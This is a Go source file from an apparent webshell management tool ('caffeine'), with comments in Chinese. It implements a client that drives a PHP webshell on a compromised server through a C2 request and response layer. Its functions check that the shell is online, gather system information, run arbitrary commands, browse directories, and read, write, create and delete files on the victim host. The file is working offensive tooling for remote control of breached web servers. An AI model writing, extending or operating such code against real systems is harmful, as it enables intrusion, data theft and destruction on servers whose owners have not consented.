package webshell

import (
	"caffeine/client/c2"
	"caffeine/core"
	"caffeine/server"
	"caffeine/server/php"
	"encoding/json"
	"fmt"
	"github.com/sirupsen/logrus"
	"path/filepath"
	"time"
)

// 与WebShell通信
type WebClient struct {
	ID              int64
	server          server.WebShellServer
	session         *core.Session
	requestHandler  *c2.RequestHandler
	responseHandler *c2.ResponseHandler
	http            *core.HttpEngine
	logger          *logrus.Logger
	errorChan       chan error // 错误通道
	init            bool       //是否初始化
}

const (
	CurrentDir = "."
	Success    = "ok"
)

func NewWebClient(target core.Target, config c2.C2Yaml) *WebClient {

	client := &WebClient{
		ID: core.GenerateID(),
		session: &core.Session{
			ID:             core.GenerateID(),
			OperateHistory: nil,
			OutputHistory:  nil,
			StartTime:      time.Now(),
			LastActive:     time.Now(),
			Target:         target,
			Environment:    make(map[string]string),
		},
		server:          php.NewPHPWebShell(),
		requestHandler:  c2.NewRequestHandler(config),
		responseHandler: c2.NewResponseHandler(config),
		http:            core.GetHttpEngine(),
		logger:          core.GetLogger(),
		errorChan:       make(chan error, 3), // 带缓冲的错误通道
	}
	client.startErrorListener()
	return client
}

func (w *WebClient) startErrorListener() {
	go func() {
		for err := range w.errorChan {
			// 统一处理错误，例如记录日志或通知用户
			w.logger.Errorf("监听到错误: %v", err)
		}
	}()
}

func (client WebClient) GetPHPClient() *php.PHPWebshell {
	if shell, ok := client.server.(*php.PHPWebshell); ok {
		return shell
	}
	return nil
}

func (client WebClient) request(data []byte) []byte {
	req, err := client.requestHandler.Handler(client.session, data)
	if err != nil {
		client.errorChan <- fmt.Errorf("%s hanlde request error: %v", core.GetSimpleFuncName(2), err)
		return nil
	}
	client.http.SubmitRequest(req)
	response, err := client.responseHandler.Handler(client.session, req.Response)
	if err != nil {
		client.errorChan <- fmt.Errorf("%s hanlde response error: %v", core.GetSimpleFuncName(2), err)
		return nil
	}
	return response
}

// Webshell 检测是否在线
func (client *WebClient) CheckConnect() bool {
	//phpClient := client.GetPHPClient()
	check := client.server.CheckOnline()
	response := client.request(check)
	if response == nil {
		return false
	}
	//添加历史记录
	client.session.AddOperateHistory(core.GetCallerName(), nil)
	return string(response) == "hello"
}

// WebShell 初次进入，获取系统信息
func (client *WebClient) GetSystemInfo() {
	info := client.server.GetOsInfo()
	response := client.request(info)
	if response == nil {
		return
	}
	var systemInfo core.SystemInfo
	err := json.Unmarshal(response, &systemInfo)

	if err != nil {
		client.errorChan <- fmt.Errorf("GetSystemInfo json unmarshal error: %v", err)
		return
	}
	client.session.Info = &systemInfo
	client.session.FileSystem = core.NewFileSystem(systemInfo.CurrentDir)
	//添加历史
	client.session.AddOperateHistory(core.GetCallerName(), nil)
}

func (client *WebClient) GetSession() *core.Session {
	return client.session
}

func (client *WebClient) GetFileSystem() *core.FileSystemCache {
	return client.session.FileSystem
}

// webshell 执行命令
func (client *WebClient) RunCMD(path, cmd string) string {
	if path == CurrentDir {
		//获取当前目录
		path = client.session.GetCurrentDir()
	}
	runCmd := client.server.RunCmd(path, cmd)
	response := client.request(runCmd)
	if response == nil {
		return ""
	}
	client.session.AddOperateHistory(core.GetCallerName(), []string{path, cmd})
	return string(response)
}

// 加载目录
func (client *WebClient) LoadDir(path string) {
	if path == CurrentDir {
		path = client.session.GetCurrentDir()
	}
	LoadData := client.server.LoadDir(path)
	response := client.request(LoadData)
	if response == nil {
		return
	}
	var dir core.Directory
	err := json.Unmarshal(response, &dir)
	if err != nil {
		client.errorChan <- fmt.Errorf("LoadDir json unmarshal error: %v", err)
	}
	dir.Init = true
	client.session.FileSystem.CacheLoadedDir(&dir)
	client.session.AddOperateHistory(core.GetCallerName(), []string{path})
}

// 读取文件
func (client WebClient) ReadFile(file *core.FileInfo) string {
	readFile := client.server.ReadFile(file)
	response := client.request(readFile)
	if response == nil {
		return ""
	}
	file.Content = string(response)
	client.session.AddOperateHistory(core.GetCallerName(), []string{file.FilePath})
	return string(response)
}

// 写入文件
func (client WebClient) WriteFile(file *core.FileInfo, content string) bool {
	writeFile := client.server.WriteFile(file, content)
	response := client.request(writeFile)
	if response == nil {
		return false
	}
	client.session.AddOperateHistory(core.GetCallerName(), []string{file.FilePath, content})
	return string(response) == Success
}

// 删除文件
func (client WebClient) DeleteFile(file *core.FileInfo) bool {
	deleteData := client.server.Delete(file.FilePath)
	response := client.request(deleteData)
	if response == nil {
		return false
	}
	if string(response) == "ok" {
		directory := client.session.FileSystem.GetDirectory(filepath.Dir(file.FilePath))
		for i, f := range directory.Files {
			if f.Name == file.Name {
				directory.Files = append(directory.Files[:i], directory.Files[i+1:]...)
			}
		}
		client.session.AddOperateHistory(core.GetCallerName(), []string{file.FilePath})
		return true
	}
	return false
}

// 删除目录
func (client WebClient) DeleteDir(dir *core.Directory) bool {
	deleteData := client.server.Delete(dir.Path)
	response := client.request(deleteData)
	if response == nil {
		return false
	}
	if string(response) == Success {
		client.session.FileSystem.RemoveDir(dir)
		client.session.AddOperateHistory(core.GetCallerName(), []string{dir.Path})
		return true
	}
	return false
}

// 创建文件
func (client WebClient) MakeFile(directory *core.Directory, fileName string) *core.FileInfo {
	filePath := directory.Path + "/" + fileName
	makeFile := client.server.MakeFile(filePath)
	response := client.request(makeFile)
	if response == nil {
		return nil
	}
	if string(response) == Success {
		file := &core.FileInfo{
			Name:         fileName,
			Size:         0,
			LastModified: time.Now(),
			Content:      "",
			Permissions:  0,
			FilePath:     filePath,
		}
		directory.Files = append(directory.Files, file)
		client.session.AddOperateHistory(core.GetCallerName(), []string{filePath})
		return file
	}
	return nil
}

// 创建目录
func (client WebClient) MakeDir(directory *core.Directory, dirName string) *core.Directory {
	dirPath := directory.Path + "/" + dirName
	makeDir := client.server.MakeDir(dirPath)
	response := client.request(makeDir)
	if response == nil {
		return nil
	}
	if string(response) == "ok" {
		//缓存子目录
		dir := &core.Directory{
			Name:           dirName,
			SubDirectories: make([]*core.Directory, 0),
			Files:          make([]*core.FileInfo, 0),
			Path:           dirPath,
			Init:           false,
		}
		directory.SubDirectories = append(directory.SubDirectories, dir)
		client.session.FileSystem.CacheLoadedDir(dir)
		client.session.AddOperateHistory(core.GetCallerName(), []string{dirPath})
		return dir
	}
	return nil
}
